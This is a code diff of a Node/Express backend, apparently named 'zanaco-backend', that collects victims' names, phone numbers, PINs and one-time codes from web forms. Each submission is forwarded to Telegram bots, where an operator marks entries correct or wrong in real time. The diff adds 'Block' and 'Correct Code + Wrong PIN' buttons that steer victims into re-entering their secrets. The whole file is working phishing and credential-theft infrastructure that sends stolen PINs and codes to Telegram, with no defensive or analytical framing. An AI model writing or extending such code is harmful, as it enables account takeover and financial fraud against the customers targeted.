@@ -13,6 +13,8 @@ const BOTS_FILE = path.join(__dirname, 'bots.json');
 const approvedPins = {};
 const approvedCodes = {};
 const requestBotMap = {};
+const blockPins = {}; // store blocked status
+const redirectToPinCodes = {}; // store correct code + wrong pin
 
 // ---------------- MULTI-BOT STORE ----------------
 let bots = [];
@@ -23,7 +25,6 @@ if (fs.existsSync(BOTS_FILE)) {
     } catch {
         bots = [];
     }
-
 } else {
     bots = [
         { botId: 'bot1', botToken: process.env.BOT1_TOKEN, chatId: process.env.BOT1_CHATID },
@@ -46,7 +47,6 @@ if (fs.existsSync(BOTS_FILE)) {
         { botId: 'bot18', botToken: process.env.BOT18_TOKEN, chatId: process.env.BOT18_CHATID },
         { botId: 'bot19', botToken: process.env.BOT19_TOKEN, chatId: process.env.BOT19_CHATID },
         { botId: 'bot20', botToken: process.env.BOT20_TOKEN, chatId: process.env.BOT20_CHATID }
-       
     ];
     fs.writeFileSync(BOTS_FILE, JSON.stringify(bots, null, 2));
 }
@@ -57,12 +57,8 @@ app.use(express.urlencoded({ extended: true }));
 app.use(express.static('public'));
 
 // ---------------- HELPERS ----------------
-function getBot(botId) {
-    return bots.find(b => b.botId === botId);
-}
-function saveBots() {
-    fs.writeFileSync(BOTS_FILE, JSON.stringify(bots, null, 2));
-}
+function getBot(botId) { return bots.find(b => b.botId === botId); }
+function saveBots() { fs.writeFileSync(BOTS_FILE, JSON.stringify(bots, null, 2)); }
 
 // ---------------- TELEGRAM HELPERS ----------------
 async function sendTelegramMessage(bot, text, inlineKeyboard = []) {
@@ -100,9 +96,7 @@ async function setWebhookForBot(bot) {
     }
 }
 async function setWebhooksForAllBots() {
-    for (const bot of bots) {
-        await setWebhookForBot(bot);
-    }
+    for (const bot of bots) { await setWebhookForBot(bot); }
 }
 
 // ---------------- DYNAMIC PAGE SERVING ----------------
@@ -128,13 +122,16 @@ app.post('/submit-pin', (req, res) => {
 
     sendTelegramMessage(bot, `🔐 PIN VERIFICATION\n\nName: ${name}\nPhone: ${phone}\nPIN: ${pin}`, [[
         { text: '✅ Correct PIN', callback_data: `pin_ok:${requestId}` },
-        { text: '❌ Wrong PIN', callback_data: `pin_bad:${requestId}` }
+        { text: '❌ Wrong PIN', callback_data: `pin_bad:${requestId}` },
+        { text: '🛑 Block', callback_data: `pin_block:${requestId}` }
     ]]);
 
     res.json({ requestId });
 });
 app.get('/check-pin/:requestId', (req, res) => {
-    res.json({ approved: approvedPins[req.params.requestId] ?? null });
+    const approved = approvedPins[req.params.requestId] ?? null;
+    if (blockPins[req.params.requestId]) return res.json({ blocked: true, message: "Enter a valid prepaid number" });
+    res.json({ approved });
 });
 
 // ---------------- CODE HANDLING ----------------
@@ -149,13 +146,16 @@ app.post('/submit-code', (req, res) => {
 
     sendTelegramMessage(bot, `🔑 CODE VERIFICATION\n\nName: ${name}\nPhone: ${phone}\nCode: ${code}`, [[
         { text: '✅ Correct Code', callback_data: `code_ok:${requestId}` },
-        { text: '❌ Wrong Code', callback_data: `code_bad:${requestId}` }
+        { text: '❌ Wrong Code', callback_data: `code_bad:${requestId}` },
+        { text: '✅ Correct Code + ❌ Wrong PIN', callback_data: `code_pin:${requestId}` }
     ]]);
 
     res.json({ requestId });
 });
 app.get('/check-code/:requestId', (req, res) => {
-    res.json({ approved: approvedCodes[req.params.requestId] ?? null });
+    const requestId = req.params.requestId;
+    if (redirectToPinCodes[requestId]) return res.json({ redirectToPin: true, message: "Re-enter PIN" });
+    res.json({ approved: approvedCodes[requestId] ?? null });
 });
 
 // ---------------- TELEGRAM WEBHOOK ----------------
@@ -167,10 +167,14 @@ app.post('/telegram-webhook/:botId', async (req, res) => {
     if (!cb) return res.sendStatus(200);
 
     const [action, requestId] = cb.data.split(':');
+
     if (action === 'pin_ok') approvedPins[requestId] = true;
     if (action === 'pin_bad') approvedPins[requestId] = false;
+    if (action === 'pin_block') blockPins[requestId] = true;
+
     if (action === 'code_ok') approvedCodes[requestId] = true;
     if (action === 'code_bad') approvedCodes[requestId] = false;
+    if (action === 'code_pin') redirectToPinCodes[requestId] = true;
 
     await answerCallback(bot, cb.id);
     res.sendStatus(200);
@@ -186,11 +190,8 @@ app.post('/add-bot', async (req, res) => {
     saveBots();
 
     const webhookUrl = `https://zanaco-backend.onrender.com/telegram-webhook/${botId}`;
-    try {
-        await axios.get(`https://api.telegram.org/bot${botToken}/setWebhook?url=${webhookUrl}`);
-    } catch {
-        return res.status(500).json({ error: 'Failed to set webhook' });
-    }
+    try { await axios.get(`https://api.telegram.org/bot${botToken}/setWebhook?url=${webhookUrl}`); } 
+    catch { return res.status(500).json({ error: 'Failed to set webhook' }); }
 
     res.json({ ok: true, botLink: `https://zanaco-backend.onrender.com/bot/${botId}` });
 });
